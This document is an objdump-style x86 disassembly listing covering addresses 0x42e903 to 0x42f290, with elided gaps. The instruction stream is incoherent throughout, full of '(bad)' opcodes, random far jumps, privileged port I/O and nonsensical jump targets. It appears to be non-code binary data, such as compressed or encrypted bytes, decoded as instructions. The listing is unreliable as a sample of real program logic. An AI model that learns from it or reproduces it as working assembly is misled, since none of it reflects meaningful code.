  42e903:	cmp    cl,BYTE PTR [edx+esi*8+0x1]
  42e907:	add    BYTE PTR [ecx+eax*1],al
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	fwait
  42e90d:	mov    eax,0x160cbd51
  42e912:	push   cs
  42e913:	lods   al,BYTE PTR ds:[esi]
  42e914:	stos   DWORD PTR es:[edi],eax
  42e915:	outs   dx,BYTE PTR ds:[esi]
  42e916:	inc    edx
  42e917:	int3   
  42e918:	lds    esi,FWORD PTR [ecx-0x17ec253b]
  42e91e:	mov    eax,ds:0x41b6991d
  42e923:	cwde   
  42e924:	jbe    0x42e960
  42e926:	(bad)  [ebx+0x56]
  42e929:	bnd jmp 0x20f9d196
  42e92f:	mov    al,ds:0xa93f87b5
  42e934:	mov    ds:0x167d1d63,al
  42e939:	sbb    eax,0xf22ddf46
  42e93e:	rol    DWORD PTR ds:0xf86be7d8,0x85
  42e945:	jmp    0x1a48:0x9d39b884
  42e94c:	dec    eax
  42e94d:	mov    ah,0xcc
  42e94f:	jmp    0x304d3166
  42e954:	cs out dx,eax
  42e956:	or     eax,DWORD PTR [edx]
  42e958:	stc    
  42e959:	jmp    0xe558:0xa8758ae8
  42e960:	and    al,0x7c
  42e962:	pop    es
  42e963:	cmc    
  42e964:	push   ebp
  42e965:	mov    bl,0x22
  42e967:	jae    0x42e92e
  42e969:	ins    WORD PTR es:[edi],dx
  42e96b:	je     0x42e948
  42e96d:	cmp    DWORD PTR [edi],edi
  42e96f:	adc    dh,BYTE PTR [edx-0x4c45e190]
  42e975:	cmp    DWORD PTR [edi],esp
  42e977:	clc    
  42e978:	and    bh,BYTE PTR [ecx-0x42fcd29a]
  42e97e:	stos   DWORD PTR es:[edi],eax
  42e97f:	mov    ah,BYTE PTR [edi+0x38]
  42e982:	xor    BYTE PTR [esi-0x354c63d0],al
  42e988:	ror    DWORD PTR [edi+eax*8-0x6c],0xd5
  42e98d:	and    eax,edi
  42e98f:	adc    al,0x89
  42e991:	scas   al,BYTE PTR es:[edi]
  42e992:	cwde   
  42e993:	stos   BYTE PTR es:[edi],al
  42e994:	pop    edi
  42e995:	fimul  DWORD PTR [ebx-0x15fd4984]
  42e99b:	rcr    BYTE PTR [eax-0x60],1
  42e99e:	adc    eax,DWORD PTR [edx]
  42e9a0:	retf   0xdf20
  42e9a3:	lock cmp BYTE PTR [edx+0x475da80f],al
  42e9aa:	or     DWORD PTR [esp+ebx*4],0x3f
  42e9ae:	and    BYTE PTR [esi-0x60],ch
  42e9b1:	out    0x6e,eax
  42e9b3:	ficom  WORD PTR [eax-0x383ef4ef]
  42e9b9:	adc    al,ch
  42e9bb:	imul   esi,ebp,0x1e
  42e9be:	sub    eax,0xcbbc366d
  42e9c3:	popf   
  42e9c4:	es in  al,0x29
  42e9c7:	arpl   WORD PTR [ebp-0x1f],cx
  42e9ca:	xchg   ecx,eax
  42e9cb:	out    0x81,al
  42e9cd:	or     DWORD PTR [edi],edx
  42e9cf:	cmp    BYTE PTR [ebx-0x45],0xe4
  42e9d3:	pop    ebx
  42e9d4:	fadd   QWORD PTR [edx]
  42e9d6:	test   DWORD PTR [ebx-0x1b],0x1b23680
  42e9dd:	xchg   ecx,eax
  42e9de:	mov    eax,0x82a0fc8d
  42e9e3:	push   edi
  42e9e4:	pop    ecx
  42e9e5:	push   eax
  42e9e6:	jp     0x42e969
  42e9e8:	stos   DWORD PTR es:[edi],eax
  42e9e9:	in     eax,dx
  42e9ea:	xchg   ebp,eax
  42e9eb:	xor    DWORD PTR [esi+0x4458e857],0x2c
  42e9f2:	pop    ecx
  42e9f3:	sub    ecx,DWORD PTR [ecx]
  42e9f5:	loope  0x42e9f2
  42e9f7:	aad    0xd6
  42e9f9:	outs   dx,BYTE PTR fs:[esi]
  42e9fb:	(bad)  
  42e9fc:	cmp    eax,0x8d9e40be
  42ea01:	ds loop 0x42e9a6
  42ea04:	jne    0x42ea17
  42ea06:	stos   DWORD PTR es:[edi],eax
  42ea07:	enter  0xf4c7,0x88
  42ea0b:	xor    ecx,edx
  42ea0d:	retf   0xed39
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	inc    ebp
  42ea81:	adc    al,0xfb
  42ea83:	inc    esp
  42ea84:	push   eax
  42ea85:	repz add DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	jae    0x42eaaf
  42ea8e:	push   eax
  42ea8f:	je     0x42ea3b
  42ea91:	add    bl,BYTE PTR [eax]
  42ea93:	aam    0x56
  42ea95:	add    edi,DWORD PTR ds:0xf7dcc7f8
  42ea9b:	mov    edi,0x333f8f63
  42eaa0:	mov    bh,0x2f
  42eaa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eaa3:	mov    dh,0x48
  42eaa5:	cmc    
  42eaa6:	and    eax,0x39ab3eeb
  42eaab:	fild   QWORD PTR [edx-0x70]
  42eaae:	arpl   WORD PTR [edx+esi*2+0x5be60ffd],ax
  42eab5:	in     eax,0xaf
  42eab7:	mov    al,BYTE PTR [edi]
  42eab9:	retf   
  42eaba:	sbb    edx,ecx
  42eabc:	adc    DWORD PTR [eax],esp
  42eabe:	es mov esp,0x5113451b
  42eac4:	sbb    dh,BYTE PTR [ecx-0x5412adc]
  42eaca:	shl    DWORD PTR [edx-0x74a49527],1
  42ead0:	mov    eax,ds:0x5ab8d809
  42ead5:	div    DWORD PTR [ebx+0x7aa9b2b5]
  42eadb:	out    dx,al
  42eadc:	jg     0x42eb18
  42eade:	push   ebp
  42eadf:	outs   dx,BYTE PTR ds:[esi]
  42eae0:	std    
  42eae1:	and    ah,bl
  42eae3:	aas    
  42eae4:	lods   al,BYTE PTR ds:[esi]
  42eae5:	fld    DWORD PTR [ebp+edx*8+0x77]
  42eae9:	or     cl,bl
  42eaeb:	and    DWORD PTR [edi],esi
  42eaed:	(bad)  
  42eaee:	loopne 0x42eb19
  42eaf0:	sbb    al,0x2
  42eaf2:	out    0x69,eax
  42eaf4:	int3   
  42eaf5:	xor    eax,0x15501726
  42eafa:	dec    esi
  42eafb:	or     ch,ah
  42eafd:	aam    0x27
  42eaff:	mov    esi,0x708fa3a
  42eb04:	mov    esi,0xb97446f3
  42eb09:	mov    eax,0x25e53f55
  42eb0e:	fimul  DWORD PTR [ebp+0x34fed329]
  42eb14:	popa   
  42eb15:	fdivr  QWORD PTR [eax+0x4c]
  42eb18:	and    bh,BYTE PTR [eax]
  42eb1a:	pop    ecx
  42eb1b:	test   DWORD PTR [edi+eax*2],0xa567cfea
  42eb22:	lock inc ebx
  42eb24:	push   esi
  42eb25:	into   
  42eb26:	mov    bl,0x2c
  42eb28:	dec    esp
  42eb29:	dec    esp
  42eb2a:	inc    ebx
  42eb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb2c:	addr16 cdq 
  42eb2e:	adc    ah,ch
  42eb30:	pop    eax
  42eb31:	push   0xffffffe4
  42eb33:	jle    0x42eb61
  42eb35:	mov    bl,ah
  42eb37:	xchg   BYTE PTR [esi-0xcfee134],al
  42eb3d:	dec    esp
  42eb3e:	add    DWORD PTR [ebp+0x11],0xb71a5813
  42eb45:	jbe    0x42eb20
  42eb47:	scas   al,BYTE PTR es:[edi]
  42eb48:	arpl   WORD PTR [ebx],di
  42eb4a:	out    dx,eax
  42eb4b:	add    dh,BYTE PTR [eax+0x42]
  42eb4e:	xor    ebp,DWORD PTR [esi]
  42eb50:	(bad)  
  42eb51:	popa   
  42eb52:	push   es
  42eb53:	xchg   ebp,eax
  42eb54:	push   es
  42eb55:	and    ebx,DWORD PTR [ecx-0x12a17f39]
  42eb5b:	fadd   QWORD PTR [esi+0x4a]
  42eb5e:	jbe    0x42eba0
  42eb60:	scas   eax,DWORD PTR es:[edi]
  42eb61:	pusha  
  42eb62:	inc    esp
  42eb63:	pop    edi
  42eb64:	jmp    0xf445:0xd771f63d
  42eb6b:	fadd   DWORD PTR [edi]
  42eb6d:	sbb    BYTE PTR [ecx],dh
  42eb6f:	enter  0x4db3,0x4a
  42eb73:	inc    esp
  42eb74:	mov    ch,al
  42eb76:	mov    bl,0x7e
  42eb78:	pop    ss
  42eb79:	test   cl,dh
  42eb7b:	cmp    BYTE PTR [esi-0x31b78520],0xc6
  42eb82:	mov    ebx,0x348a8cb1
  42eb87:	jp     0x42ebf5
  42eb89:	out    0x3d,eax
  42eb8b:	mov    dh,0xa5
  42eb8d:	in     al,dx
  42eb8e:	and    dl,BYTE PTR [eax+0x0]
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sub    DWORD PTR [ebx],0x54bdce18
  42ec05:	hlt    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    al,0x1
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	jmp    0xae04:0x3ba010d8
  42ec13:	and    BYTE PTR ds:0xae88978e,dl
  42ec19:	out    dx,al
  42ec1a:	jns    0x42ec3a
  42ec1c:	jge    0x42ebf2
  42ec1e:	adc    ah,bh
  42ec20:	aam    0xa5
  42ec22:	mov    ds:0x39e05f8,eax
  42ec27:	in     eax,0x81
  42ec29:	push   eax
  42ec2a:	xor    ah,dl
  42ec2c:	adc    BYTE PTR [esi],dh
  42ec2e:	aaa    
  42ec2f:	mov    al,ds:0xa2f03f6f
  42ec34:	(bad)  
  42ec35:	outs   dx,BYTE PTR ds:[esi]
  42ec36:	jg     0x42ec63
  42ec38:	into   
  42ec39:	adc    DWORD PTR [eax-0x66],edi
  42ec3c:	and    eax,0x8f4ea368
  42ec41:	out    0xa4,eax
  42ec43:	jmp    0x447ab826
  42ec48:	inc    ecx
  42ec49:	loope  0x42ec59
  42ec4b:	in     al,dx
  42ec4c:	or     eax,0x855655d8
  42ec51:	xchg   BYTE PTR [esi],al
  42ec53:	shl    BYTE PTR [ecx+0x73795ae0],cl
  42ec59:	shr    BYTE PTR [ebp+0x69],0x58
  42ec5d:	lock idiv BYTE PTR [ecx]
  42ec60:	mov    eax,ds:0xc5a99d6c
  42ec65:	nop
  42ec66:	daa    
  42ec67:	imul   ebx,DWORD PTR [ecx+ebp*8],0xb906256b
  42ec6e:	into   
  42ec6f:	aas    
  42ec70:	(bad)  
  42ec71:	outs   dx,DWORD PTR ds:[esi]
  42ec72:	in     eax,dx
  42ec73:	(bad)  
  42ec74:	pop    ecx
  42ec75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec76:	push   ebp
  42ec77:	jae    0x42ec25
  42ec79:	psrad  mm7,mm2
  42ec7c:	jne    0x42ec8c
  42ec7e:	jnp    0x42ec87
  42ec80:	push   ebx
  42ec81:	sub    dl,ah
  42ec83:	pushf  
  42ec84:	push   ecx
  42ec85:	jmp    ebp
  42ec87:	test   eax,0xa7ff0681
  42ec8c:	fs push ebp
  42ec8e:	shr    BYTE PTR [ebx-0x7f890625],1
  42ec94:	addr16 cld 
  42ec96:	scas   eax,DWORD PTR es:[edi]
  42ec97:	mov    al,al
  42ec99:	sbb    al,0x48
  42ec9b:	inc    esi
  42ec9c:	sub    ecx,DWORD PTR [edx]
  42ec9e:	ins    DWORD PTR es:[edi],dx
  42ec9f:	xchg   ecx,eax
  42eca0:	loopne 0x42ec4b
  42eca2:	add    al,0x50
  42eca4:	out    0x66,al
  42eca6:	xchg   esp,eax
  42eca7:	mov    eax,DWORD PTR [esi-0x7f84d190]
  42ecad:	jle    0x42ed24
  42ecaf:	repz mov al,0xce
  42ecb2:	push   edi
  42ecb3:	hlt    
  42ecb4:	mov    ebx,DWORD PTR [eax]
  42ecb6:	mov    ds:0x9fab45a9,al
  42ecbb:	sbb    ebp,edi
  42ecbd:	or     DWORD PTR [esp+esi*4-0x113b4872],esp
  42ecc4:	repnz fdivr DWORD PTR [eax-0x6d]
  42ecc8:	ins    DWORD PTR es:[edi],dx
  42ecc9:	into   
  42ecca:	out    0xe5,al
  42eccc:	xchg   BYTE PTR [edi+0x784a1501],dh
  42ecd2:	aam    0x42
  42ecd4:	test   al,0x8c
  42ecd6:	aam    0x0
  42ecd8:	(bad)  
  42ecd9:	test   eax,0xd2a18563
  42ecde:	or     BYTE PTR [ebx+0x53d5c188],dl
  42ece4:	les    eax,FWORD PTR [edi-0x78]
  42ece7:	pop    esp
  42ece8:	repz dec ecx
  42ecea:	mov    ecx,0x86891b2
  42ecef:	adc    dl,BYTE PTR [eax]
  42ecf1:	mov    esi,0xb4ca52c9
  42ecf6:	push   ss
  42ecf7:	cmp    ebx,ebx
  42ecf9:	mov    dl,0xdc
  42ecfb:	or     esi,DWORD PTR [edx]
  42ecfd:	int3   
  42ecfe:	jo     0x42ed69
  42ed00:	push   esi
  42ed01:	pushf  
  42ed02:	(bad)  
  42ed03:	addr16 cwde 
  42ed05:	mov    eax,DWORD PTR [edi-0x54]
  42ed08:	addr16 mov edi,0x14c5729d
  42ed0e:	mov    ch,0x5f
	...
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0x69abf7ec],esp
  42ed84:	pop    eax
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	lods   al,BYTE PTR ds:[esi]
  42ed8d:	inc    edx
  42ed8e:	fsub   st,st(5)
  42ed90:	sub    edx,DWORD PTR [ecx-0x4d]
  42ed93:	in     al,dx
  42ed94:	iret   
  42ed95:	imul   eax,DWORD PTR [ebp-0x5a],0x49
  42ed99:	xchg   esi,eax
  42ed9a:	retf   
  42ed9b:	out    0x8,al
  42ed9d:	(bad)  
  42ed9e:	sbb    DWORD PTR [edi+0x0],esi
  42eda1:	mov    ds,eax
  42eda3:	hlt    
  42eda4:	into   
  42eda5:	ret    0x33ae
  42eda8:	ins    DWORD PTR es:[edi],dx
  42eda9:	adc    eax,edi
  42edab:	int    0x16
  42edad:	xor    ebx,DWORD PTR [edi+eax*4]
  42edb0:	in     al,dx
  42edb1:	scas   eax,DWORD PTR es:[edi]
  42edb2:	rol    DWORD PTR [edi-0x3229369],0xc9
  42edb9:	mov    al,ds:0x58067158
  42edbe:	aad    0x69
  42edc0:	imul   esp,DWORD PTR [edx-0x2d],0xa05b592c
  42edc7:	pop    ds
  42edc8:	xor    DWORD PTR [esi],edx
  42edca:	scas   eax,DWORD PTR es:[edi]
  42edcb:	or     eax,0xe9dc45ab
  42edd0:	push   esi
  42edd1:	xor    al,0x87
  42edd3:	mov    WORD PTR [edi+0x3],gs
  42edd6:	jnp    0x42ed7c
  42edd8:	imul   edx,DWORD PTR [ecx-0x1b],0xed4ab6e7
  42eddf:	inc    edi
  42ede0:	sar    DWORD PTR [edi],cl
  42ede2:	mov    al,ds:0x8fc0880b
  42ede7:	xor    al,BYTE PTR ds:0xa1c00d68
  42eded:	sbb    dl,ah
  42edef:	mov    eax,ds:0x94c774ef
  42edf4:	(bad)  
  42edf5:	out    0xb8,eax
  42edf7:	(bad)  
  42edf8:	mov    ds:0x4095ea3a,eax
  42edfd:	inc    eax
  42edfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42edff:	cs push cs
  42ee01:	inc    eax
  42ee02:	fsubr  DWORD PTR [ebp+0x44e0b6e5]
  42ee08:	sti    
  42ee09:	xchg   ebp,eax
  42ee0a:	jb     0x42ede4
  42ee0c:	adc    DWORD PTR [esi-0x26db0584],esi
  42ee12:	mov    esp,0xf3e9489b
  42ee17:	adc    eax,0x3428a3e5
  42ee1c:	in     al,0x4b
  42ee1e:	cmp    ebx,DWORD PTR [ebx-0xe934d8]
  42ee24:	push   ds
  42ee25:	xchg   ebx,eax
  42ee26:	popf   
  42ee27:	and    BYTE PTR [edx-0x6],0xbf
  42ee2b:	aas    
  42ee2c:	loopne 0x42ee0f
  42ee2e:	ret    0xb718
  42ee31:	in     eax,0xb
  42ee33:	mov    eax,ds:0xa7f010f9
  42ee38:	(bad)  
  42ee39:	sub    al,0x7a
  42ee3b:	rcl    BYTE PTR [ebp-0x74],1
  42ee3e:	sti    
  42ee3f:	or     bl,BYTE PTR [eax+0x6b]
  42ee42:	xlat   BYTE PTR ds:[ebx]
  42ee43:	dec    esi
  42ee44:	popa   
  42ee45:	fldenv [edx-0x41]
  42ee48:	out    0x1f,al
  42ee4a:	mov    ss,edi
  42ee4c:	out    dx,eax
  42ee4d:	daa    
  42ee4e:	data16 jo 0x42ee72
  42ee51:	sub    al,0x44
  42ee53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee54:	mov    ecx,cs
  42ee56:	stc    
  42ee57:	inc    ebx
  42ee58:	jbe    0x42eebf
  42ee5a:	pusha  
  42ee5b:	xchg   esp,eax
  42ee5c:	les    edx,FWORD PTR [edi]
  42ee5e:	dec    ecx
  42ee5f:	xor    esp,DWORD PTR [edi]
  42ee61:	pop    ss
  42ee62:	sar    BYTE PTR [edx+eax*8-0x10da4367],1
  42ee69:	out    0xaf,eax
  42ee6b:	std    
  42ee6c:	or     BYTE PTR [eax-0x61e97395],bh
  42ee72:	push   es
  42ee73:	fmul   DWORD PTR ds:0x1fc4d519
  42ee79:	pusha  
  42ee7a:	call   0xd843d4e9
  42ee7f:	jno    0x42ee4e
  42ee81:	pop    ds
  42ee82:	pop    ss
  42ee83:	outs   dx,DWORD PTR ds:[esi]
  42ee84:	xchg   ebp,eax
  42ee85:	neg    BYTE PTR [ebx+0x7d69b67]
  42ee8b:	inc    edx
  42ee8c:	push   cs
  42ee8d:	ss jp  0x42eee8
	...
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	mov    al,ds:0x5c71a4c7
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	mov    ebp,0xe2f694cc
  42ef11:	idiv   BYTE PTR [edi-0x79]
  42ef14:	ja     0x42eee0
  42ef16:	(bad)  
  42ef17:	xchg   edi,eax
  42ef18:	jne    0x42ef90
  42ef1a:	test   eax,0x79a8d87c
  42ef1f:	in     al,dx
  42ef20:	or     BYTE PTR [eax-0x35],ah
  42ef23:	or     esp,DWORD PTR [ebp-0x4f42730f]
  42ef29:	mov    ds:0xdbe3b95a,eax
  42ef2e:	add    eax,0x85d91171
  42ef33:	stos   BYTE PTR es:[edi],al
  42ef34:	add    ebp,DWORD PTR [eax-0x16]
  42ef37:	jl     0x42ef22
  42ef39:	out    dx,al
  42ef3a:	fs out dx,eax
  42ef3c:	cmp    al,0x65
  42ef3e:	jmp    0x53170afa
  42ef43:	(bad)  
  42ef44:	loopne 0x42ef3d
  42ef46:	ret    0xf12e
  42ef49:	push   0x66
  42ef4b:	add    al,0x17
  42ef4d:	pushf  
  42ef4e:	lock xchg esp,eax
  42ef50:	and    bh,BYTE PTR [esi]
  42ef52:	jle    0x42ef03
  42ef54:	js     0x42ef2f
  42ef56:	dec    edx
  42ef57:	push   edi
  42ef58:	xor    al,0x1d
  42ef5a:	jp     0x42ef19
  42ef5c:	in     eax,0x8c
  42ef5e:	stos   DWORD PTR es:[edi],eax
  42ef5f:	pop    ss
  42ef60:	and    DWORD PTR [edx-0x52fe5517],0xffffffcb
  42ef67:	bound  ecx,QWORD PTR [ecx]
  42ef69:	out    0xaa,al
  42ef6b:	stos   BYTE PTR es:[edi],al
  42ef6c:	inc    esp
  42ef6d:	push   edi
  42ef6e:	mov    dl,0x63
  42ef70:	and    DWORD PTR [eax+ecx*8],0x7d
  42ef74:	sbb    eax,0x989d316a
  42ef79:	mov    dh,0xc8
  42ef7b:	pop    ecx
  42ef7c:	mov    dl,0x6f
  42ef7e:	jae    0x42efd1
  42ef80:	mov    esp,0x760c6b8d
  42ef85:	int    0x23
  42ef87:	push   eax
  42ef88:	push   ebp
  42ef89:	add    al,0x38
  42ef8b:	add    al,0x12
  42ef8d:	bound  ebx,QWORD PTR [eax]
  42ef8f:	sub    DWORD PTR [edx],ecx
  42ef91:	or     eax,0xd036db4
  42ef96:	sahf   
  42ef97:	sbb    DWORD PTR [edi+0x2ca2410c],edx
  42ef9d:	cld    
  42ef9e:	in     eax,dx
  42ef9f:	data16 icebp 
  42efa1:	fwait
  42efa2:	out    0x25,al
  42efa4:	pop    ss
  42efa5:	push   0x3134246
  42efaa:	fsub   DWORD PTR [ecx+0x7e494569]
  42efb0:	retf   0x94c4
  42efb3:	out    dx,eax
  42efb4:	and    DWORD PTR [edx],ebx
  42efb6:	push   0x1db0919c
  42efbb:	outs   dx,BYTE PTR ds:[esi]
  42efbc:	cmp    al,0xd9
  42efbe:	cmp    al,0x34
  42efc0:	mov    ds:0x873ee853,eax
  42efc5:	imul   esi,DWORD PTR [ecx],0x2e4ace25
  42efcb:	pop    ebp
  42efcc:	jmp    FWORD PTR [esi-0x73]
  42efcf:	xchg   edi,eax
  42efd0:	in     al,0x76
  42efd2:	cmp    DWORD PTR [edx-0x44],ecx
  42efd5:	aam    0x14
  42efd7:	leave  
  42efd8:	dec    ecx
  42efd9:	dec    ebx
  42efda:	mov    esi,0x6cf39427
  42efdf:	mov    ds:0x539a33e9,al
  42efe4:	loop   0x42efba
  42efe6:	xchg   BYTE PTR [ebx-0x17235165],dh
  42efec:	(bad)  
  42efed:	retf   0x8a22
  42eff0:	mov    fs,WORD PTR [ebx]
  42eff2:	leave  
  42eff3:	cli    
  42eff4:	cmp    BYTE PTR [ebx],cl
  42eff6:	aaa    
  42eff7:	dec    ecx
  42eff8:	pop    ds
  42eff9:	adc    DWORD PTR [ecx],0x6bf9fc0
  42efff:	imul   eax,DWORD PTR [ebp+eax*1-0x56],0xfffffff7
  42f004:	add    BYTE PTR [eax],0x53
  42f007:	ja     0x42f064
  42f009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f00a:	jns    0x42f08b
  42f00c:	into   
  42f00d:	jg     0x42efb0
  42f00f:	jo     0x42f011
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	dec    ecx
  42f081:	cmp    DWORD PTR [ebx+0x1f76037],0x0
  42f088:	add    al,0x1
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	mov    ah,0x51
  42f08e:	xchg   ebp,eax
  42f08f:	aas    
  42f090:	loopne 0x42f0c5
  42f092:	mov    edx,0x953c1992
  42f097:	jno    0x42f04a
  42f099:	and    BYTE PTR [edi+0x32ca315e],0x5b
  42f0a0:	cld    
  42f0a1:	call   FWORD PTR [esp+ebp*4-0x1a]
  42f0a5:	xchg   ecx,eax
  42f0a6:	and    eax,0x9bb44dd3
  42f0ab:	cli    
  42f0ac:	mov    ds:0xc4e714b9,eax
  42f0b1:	scas   al,BYTE PTR es:[edi]
  42f0b2:	ss xchg edx,eax
  42f0b4:	cmp    BYTE PTR [ebx-0x2b],dl
  42f0b7:	ins    BYTE PTR es:[edi],dx
  42f0b8:	ror    DWORD PTR [ecx-0x5fa52642],0xd4
  42f0bf:	(bad)  
  42f0c0:	clc    
  42f0c1:	gs ins BYTE PTR es:[edi],dx
  42f0c3:	jb     0x42f067
  42f0c5:	xor    al,0x10
  42f0c7:	sbb    esi,DWORD PTR [esi-0x56]
  42f0ca:	clc    
  42f0cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0cc:	ds push ebp
  42f0ce:	sub    esp,edi
  42f0d0:	dec    ecx
  42f0d1:	(bad)  [edi-0x63]
  42f0d4:	mov    ebx,0x24a04149
  42f0d9:	addr16 jmp 0x7f1ddcba
  42f0df:	ror    esi,0xc4
  42f0e2:	in     eax,0x59
  42f0e4:	scas   eax,DWORD PTR es:[edi]
  42f0e5:	bound  ecx,QWORD PTR [edi-0x2a]
  42f0e8:	inc    edi
  42f0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0ea:	(bad)  
  42f0eb:	pop    ss
  42f0ec:	and    ebp,esi
  42f0ee:	popf   
  42f0ef:	add    ebx,DWORD PTR [edx]
  42f0f1:	leave  
  42f0f2:	data16 je 0x42f10b
  42f0f5:	adc    DWORD PTR [eax],esp
  42f0f7:	inc    ebx
  42f0f8:	addr16 mov esi,0x128dc494
  42f0fe:	sub    BYTE PTR [esi],ah
  42f100:	lahf   
  42f101:	mov    eax,ds:0x5f53776b
  42f106:	dec    ebx
  42f107:	(bad)  
  42f108:	bnd jnp 0x42f148
  42f10b:	fdiv   st(4),st
  42f10d:	in     al,0x5b
  42f10f:	cmp    eax,0xf2788057
  42f114:	repz jge 0x42f172
  42f117:	std    
  42f118:	sti    
  42f119:	mov    ah,0xce
  42f11b:	imul   edx,DWORD PTR [ecx],0xffffff97
  42f11e:	popa   
  42f11f:	mov    WORD PTR [eax+0x9035cba],es
  42f125:	fmul   QWORD PTR [ebx]
  42f127:	xchg   edx,eax
  42f128:	pop    ss
  42f129:	dec    ebx
  42f12a:	jmp    0xbf:0xa198161c
  42f131:	test   dl,ch
  42f133:	sbb    ebx,DWORD PTR [ecx-0x71]
  42f136:	cmp    cl,bh
  42f138:	int3   
  42f139:	sbb    al,0x77
  42f13b:	fiadd  WORD PTR [ebp-0x5cb55635]
  42f141:	push   edx
  42f142:	loop   0x42f103
  42f144:	hlt    
  42f145:	test   eax,0x1251ca10
  42f14a:	fwait
  42f14b:	dec    esi
  42f14c:	out    dx,al
  42f14d:	push   edi
  42f14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f14f:	adc    al,0x92
  42f151:	mov    esp,0xa75a2082
  42f156:	clc    
  42f157:	outs   dx,DWORD PTR ds:[esi]
  42f158:	mov    dh,0xb7
  42f15a:	es adc al,0xc6
  42f15d:	mov    ebx,0x39865ebf
  42f162:	popa   
  42f163:	out    0xcd,al
  42f165:	pop    ds
  42f166:	dec    ebp
  42f167:	pop    ss
  42f168:	adc    BYTE PTR [esi+esi*8],bl
  42f16b:	mov    ebp,DWORD PTR [edi+0x52629573]
  42f171:	mov    edi,0x623388fb
  42f176:	mov    cl,0xd7
  42f178:	jge    0x42f1c4
  42f17a:	add    dh,BYTE PTR [esi+eiz*2]
  42f17d:	dec    esi
  42f17e:	out    0x53,eax
  42f180:	jp     0x42f1ed
  42f182:	mov    eax,ds:0x63c9cccc
  42f187:	daa    
  42f188:	sahf   
  42f189:	(bad)  
  42f18a:	cmp    eax,0x4966b5ca
  42f18f:	mov    ebp,0x0
	...
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	popa   
  42f201:	cmp    al,0x6c
  42f203:	shl    DWORD PTR [eax+edi*8+0x1],cl
  42f207:	add    BYTE PTR [ecx+eax*1],al
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	mov    eax,ds:0xc8648764
  42f211:	clc    
  42f212:	mov    dl,0x25
  42f214:	fmul   DWORD PTR [edx]
  42f216:	test   DWORD PTR [edi-0x64],ebp
  42f219:	inc    ebx
  42f21a:	fiadd  WORD PTR [ebp-0x421efe99]
  42f220:	pop    es
  42f221:	mov    esp,0xa7352d78
  42f226:	mul    BYTE PTR [ecx]
  42f228:	inc    edx
  42f229:	outs   dx,BYTE PTR ds:[esi]
  42f22a:	push   ds
  42f22b:	clc    
  42f22c:	jl     0x42f27f
  42f22e:	sti    
  42f22f:	(bad)  
  42f231:	scas   eax,DWORD PTR es:[edi]
  42f232:	dec    ebx
  42f233:	es mov ebp,0x70ae26dc
  42f239:	aam    0xbe
  42f23b:	fdivrp st(5),st
  42f23d:	jmp    0x42f28e
  42f23f:	mov    ds:0xd111e039,eax
  42f244:	repz cmp DWORD PTR ds:0x31acfc79,0xb2ba689f
  42f24f:	sub    bh,BYTE PTR [ecx]
  42f251:	rcl    DWORD PTR [edx-0x41],0x41
  42f255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f256:	xor    ah,BYTE PTR [eax-0x1f]
  42f259:	test   al,0x39
  42f25b:	loope  0x42f2a6
  42f25d:	push   esi
  42f25e:	add    DWORD PTR [edx],0x5e0f8581
  42f264:	sub    dh,BYTE PTR [edi-0x58]
  42f267:	push   ebx
  42f268:	dec    eax
  42f269:	push   ecx
  42f26a:	stos   DWORD PTR es:[edi],eax
  42f26b:	aaa    
  42f26c:	jmp    0x42f23e
  42f26e:	mov    ah,0x7f
  42f270:	std    
  42f271:	lea    ecx,[edi-0x6bd39a6b]
  42f277:	(bad)  
  42f278:	out    dx,eax
  42f279:	mov    bh,0xcf
  42f27b:	mov    bh,0xc1
  42f27d:	out    dx,al
  42f27e:	and    al,0xa
  42f280:	xchg   ecx,eax
  42f281:	push   edi
  42f282:	idiv   BYTE PTR [edi-0x77a41c75]
  42f288:	add    esi,DWORD PTR [esi+ecx*8-0x5a]
  42f28c:	xrelease xchg DWORD PTR [edi+0x4b],ecx
  42f290:	test   al,0xa8
